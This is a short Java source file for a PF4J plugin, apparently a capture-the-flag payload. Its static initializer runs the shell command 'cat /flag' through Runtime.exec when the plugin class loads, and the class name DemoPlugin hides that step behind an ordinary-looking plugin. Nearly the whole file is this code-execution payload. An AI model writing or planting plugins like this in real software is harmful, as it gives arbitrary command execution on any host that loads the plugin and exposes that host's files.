import org.pf4j.Plugin;
import org.pf4j.PluginWrapper;

import java.io.IOException;

public class DemoPlugin extends Plugin {

    static {
        try {
            Runtime.getRuntime().exec("cat /flag");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public DemoPlugin(PluginWrapper wrapper) {
        super(wrapper);
    }
}
